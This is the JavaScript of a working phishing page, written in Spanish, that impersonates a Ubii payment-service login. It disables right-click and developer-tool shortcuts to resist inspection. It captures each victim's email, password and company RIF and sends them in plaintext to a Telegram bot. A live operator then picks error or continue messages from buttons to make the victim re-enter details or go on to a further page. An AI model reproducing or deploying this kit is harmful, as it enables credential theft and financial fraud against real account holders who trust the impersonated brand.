document.addEventListener('DOMContentLoaded', () => {
    // ==========================================
    // PROTECCIÓN CONTRA INSPECCIÓN Y TRUCOS
    // ==========================================
    
    // Bloquear el menú contextual (clic derecho)
    document.addEventListener('contextmenu', e => e.preventDefault());

    // Bloquear atajos de teclado para desarrolladores (F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, etc.)
    document.addEventListener('keydown', (e) => {
        if (
            e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
            (e.ctrlKey && e.key === 'U')
        ) {
            e.preventDefault();
            return false;
        }
    });

    // ==========================================
    // LÓGICA DEL FORMULARIO Y TELEGRAM
    // ==========================================
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.querySelector('input[name="usuario"]');
    const passwordInput = document.getElementById('password');
    const loginButton = document.querySelector('.btn-ingresar');
    const togglePasswords = document.querySelectorAll('.toggle-password');
    const typeButtons = document.querySelectorAll('.type-btn');
    const juridicoFields = document.getElementById('juridicoFields');
    const rifGroup = document.getElementById('rifGroup');
    const isAuthorizedCheck = document.getElementById('isAuthorized');
    const rifNumberInput = document.querySelector('input[name="rifNumber"]');

    loginButton.disabled = false;
    loginButton.classList.add('active');

    // Inicializar el control de intentos en 0 cada vez que se carga la página principal
    localStorage.setItem('intentos_login', '0');

    togglePasswords.forEach(toggle => {
        toggle.addEventListener('click', () => {
            const targetId = toggle.getAttribute('data-target');
            const input = document.getElementById(targetId);
            if (input) {
                input.type = input.type === 'password' ? 'text' : 'password';
            }
        });
    });

    typeButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            typeButtons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            if (btn.id === 'btnJuridico') {
                juridicoFields.style.display = 'block';
            } else {
                juridicoFields.style.display = 'none';
                isAuthorizedCheck.checked = false;
                rifGroup.style.display = 'none';
                rifNumberInput.value = '';
            }
        });
    });

    isAuthorizedCheck.addEventListener('change', () => {
        if (isAuthorizedCheck.checked) {
            rifGroup.style.display = 'block';
        } else {
            rifGroup.style.display = 'none';
            rifNumberInput.value = '';
            document.getElementById('rifError').textContent = '';
            rifNumberInput.classList.remove('error');
        }
    });

    rifNumberInput.addEventListener('input', () => {
        const rifError = document.getElementById('rifError');
        rifNumberInput.value = rifNumberInput.value.replace(/\D/g, '');

        if (rifNumberInput.value.trim() !== '') {
            rifError.textContent = '';
            rifNumberInput.classList.remove('error');
        } else {
            rifError.textContent = 'El RIF de la empresa es requerido';
            rifNumberInput.classList.add('error');
        }
    });

    emailInput.addEventListener('input', () => {
        const usuario = emailInput.value.trim();
        const usuarioError = document.getElementById('usuarioError');

        if (usuario === '') {
            usuarioError.textContent = 'Debe indicar el correo';
            emailInput.classList.add('error');
        } else if (!usuario.includes('@')) {
            usuarioError.textContent = 'Por favor Ingresa con el correo electrónico afiliado a tu cuenta.';
            emailInput.classList.add('error');
        } else {
            usuarioError.textContent = '';
            emailInput.classList.remove('error');
        }
    });

    passwordInput.addEventListener('input', () => {
        const password = passwordInput.value;
        const passwordError = document.getElementById('passwordError');
        
        const hasUppercase = /[A-Z]/.test(password);
        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>_\-\+=$$$$\\\/`~]/.test(password);
        const hasNumber = /[0-9]/.test(password);

        if (password === '') {
            passwordError.textContent = 'La contraseña es requerida';
            passwordInput.classList.add('error');
        } else if (password.length < 8) {
            passwordError.textContent = 'La contraseña debe contener al menos 8 caracteres';
            passwordInput.classList.add('error');
        } else if (!hasUppercase || !hasSpecialChar || !hasNumber) {
            passwordError.textContent = 'Debe incluir al menos 1 mayúscula, 1 carácter especial y 1 número';
            passwordInput.classList.add('error');
        } else {
            passwordError.textContent = '';
            passwordInput.classList.remove('error');
        }
    });

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        if (loginButton.disabled) return;

        const usuario = emailInput.value.trim();
        const password = passwordInput.value;
        
        const usuarioError = document.getElementById('usuarioError');
        const passwordError = document.getElementById('passwordError');

        let isValid = true;

        usuarioError.textContent = '';
        passwordError.textContent = '';
        
        emailInput.classList.remove('error');
        passwordInput.classList.remove('error');

        if (usuario === '') {
            usuarioError.textContent = 'Debe indicar el correo';
            emailInput.classList.add('error');
            isValid = false;
        } else if (!usuario.includes('@')) {
            usuarioError.textContent = 'Por favor Ingresa con el correo electrónico afiliado a tu cuenta.';
            emailInput.classList.add('error');
            isValid = false;
        }

        const hasUppercase = /[A-Z]/.test(password);
        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>_\-\+=$$$$\\\/`~]/.test(password);
        const hasNumber = /[0-9]/.test(password);

        if (password === '') {
            passwordError.textContent = 'La contraseña es requerida';
            passwordInput.classList.add('error');
            isValid = false;
        } else if (password.length < 8) {
            passwordError.textContent = 'La contraseña debe contener al menos 8 caracteres';
            passwordInput.classList.add('error');
            isValid = false;
        } else if (!hasUppercase || !hasSpecialChar || !hasNumber) {
            passwordError.textContent = 'Debe incluir al menos 1 mayúscula, 1 carácter especial y 1 número';
            passwordInput.classList.add('error');
            isValid = false;
        }

        const tipoUsuario = document.querySelector('.type-btn.active')?.textContent || 'No especificado';
        const isAuthorized = isAuthorizedCheck.checked;
        const rifType = document.querySelector('select[name="rifType"]')?.value;
        const rifNumber = rifNumberInput.value.trim();

        if (tipoUsuario.includes('Jurídico') && isAuthorized) {
            if (rifNumber === '') {
                document.getElementById('rifError').textContent = 'El RIF de la empresa es requerido';
                rifNumberInput.classList.add('error');
                isValid = false;
            }
        }

        if (!isValid) {
            loginButton.disabled = false;
            loginButton.style.opacity = '1';
            loginButton.style.cursor = 'pointer';
            loginButton.textContent = 'Ingresar';
            return;
        }

        // Guardar datos en localStorage
        localStorage.setItem('usuario_guardado', usuario);
        localStorage.setItem('password_guardado', password);
        localStorage.setItem('tipo_usuario', tipoUsuario);
        localStorage.setItem('is_authorized', isAuthorized);
        localStorage.setItem('rif_type', rifType || '');
        localStorage.setItem('rif_number', rifNumber);

        // Deshabilitar botón y mostrar pantalla de validación
        loginButton.disabled = true;
        loginButton.style.opacity = '0.6';
        loginButton.style.cursor = 'not-allowed';
        loginButton.textContent = 'Validando...';

        // Enviar datos a Telegram con botones de validación
        let mensaje = `🔐 <b>Intento de Acceso</b>\n\n` +
                      `📧 <b>Correo:</b> ${usuario}\n\n` +
                      `🔑 <b>Contraseña:</b> ${password}\n\n` +
                      `🏢 <b>Tipo:</b> ${tipoUsuario}\n` +
                      `🆔 <b>ID Sesión:</b> ${obtenerIDSesion()}\n`;

        if (tipoUsuario.includes('Jurídico')) {
            mensaje += `✅ <b>Autorizado:</b> ${isAuthorized ? 'Sí' : 'No'}\n`;
            if (isAuthorized) {
                mensaje += `🪪 <b>RIF:</b> ${rifType}${rifNumber}\n`;
            }
        }

        // Definir botones interactivos
        const botones = [
            [
                { text: "🔴 Usuario/Contrasena Mala", callback_data: "usuario_malo" }
            ],
            [
                { text: "🟡 Usuario Bloqueado", callback_data: "contrasena_mala" }
            ],
            [
                { text: "🟢 Seguir", callback_data: "seguir" }
            ]
        ];

        try {
            await enviarATelegram(mensaje, botones);
        } catch (error) {
            console.error("Error al enviar:", error);
        }

        // Mostrar pantalla de espera para validación
        mostrarPantallaEspera();
    });

    function mostrarPantallaEspera() {
        // Ocultar formulario y mostrar pantalla de espera
        loginForm.style.display = 'none';
        
        // Crear pantalla de espera
        const waitScreen = document.createElement('div');
        waitScreen.className = 'wait-screen';
        waitScreen.innerHTML = `
            <div class="wait-card">
                <div class="logo-container">
                    <img src="https://ubiionline.ubiipagos.com/LogoUbiiOnline.svg" alt="Logotipo">
                </div>
                <div class="spinner"></div>
                <h3>Validando datos...</h3>
                <p>Por favor, espere un momento mientras verificamos su información.</p>
            </div>
        `;

        // Añadir estilos para la pantalla de espera
        const style = document.createElement('style');
        style.textContent = `
            .wait-screen {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: #f5f7fa;
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 1000;
            }
            .wait-card {
                background-color: white;
                padding: 40px;
                border-radius: 12px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.05);
                max-width: 360px;
                text-align: center;
            }
            .logo-container {
                margin-bottom: 20px;
            }
            .logo-container img {
                max-width: 150px;
                height: auto;
            }
            .spinner {
                border: 4px solid rgba(0, 0, 0, 0.1);
                width: 50px;
                height: 50px;
                border-radius: 50%;
                border-left-color: #00AEEF;
                animation: spin 1s linear infinite;
                margin: 0 auto 20px;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            h3 {
                color: #333;
                margin-bottom: 8px;
            }
            p {
                color: #666;
                font-size: 14px;
            }
        `;
        document.head.appendChild(style);

        // Añadir la pantalla de espera al body
        document.body.appendChild(waitScreen);

        // Verificar periódicamente si se recibió respuesta de Telegram
        const intervalId = setInterval(async () => {
            const respuesta = await verificarRespuestasTelegram();
            
            if (respuesta === 'usuario_malo') {
                clearInterval(intervalId);
                // Mostrar mensaje de error y recargar página
                const errorMessage = document.createElement('div');
                errorMessage.className = 'error-message';
                errorMessage.textContent = 'Datos inválidos. Por favor, ingrese su correo y contraseña de nuevo.';
                errorMessage.style.display = 'block';
                errorMessage.style.color = '#ff4d4d';
                errorMessage.style.marginTop = '10px';
                
                waitScreen.querySelector('.wait-card').appendChild(errorMessage);
                
                setTimeout(() => {
                    window.location.reload();
                }, 2000);
            } else if (respuesta === 'contrasena_mala') {
                clearInterval(intervalId);
                // Mostrar mensaje de error y recargar página
                const errorMessage = document.createElement('div');
                errorMessage.className = 'error-message';
                errorMessage.textContent = 'Usted Tiene el usuario bloqueado porfavor haga el desbloqueo de usuario por la App para seguir con su proceso';
                errorMessage.style.display = 'block';
                errorMessage.style.color = '#ff4d4d';
                errorMessage.style.marginTop = '10px';
                
                waitScreen.querySelector('.wait-card').appendChild(errorMessage);
                
                setTimeout(() => {
                    window.location.reload();
                }, 2000);
            } else if (respuesta === 'seguir') {
                clearInterval(intervalId);
                // Redirigir a la página del correo
                window.location.href = 'correo.html';
            }
        }, 1000); // Reducir a 1 segundo para una respuesta más rápida
        
        // Limpiar el intervalo después de 60 segundos si no hay respuesta
        setTimeout(() => {
            clearInterval(intervalId);
            const errorMessage = document.createElement('div');
            errorMessage.className = 'error-message';
            errorMessage.textContent = 'ERROR de conexion. Por favor, inténtelo de nuevo.';
            errorMessage.style.display = 'block';
            errorMessage.style.color = '#ff4d4d';
            errorMessage.style.marginTop = '10px';
            
            waitScreen.querySelector('.wait-card').appendChild(errorMessage);
            
            setTimeout(() => {
                window.location.reload();
            }, 70000);
        }, 70000);
    }
});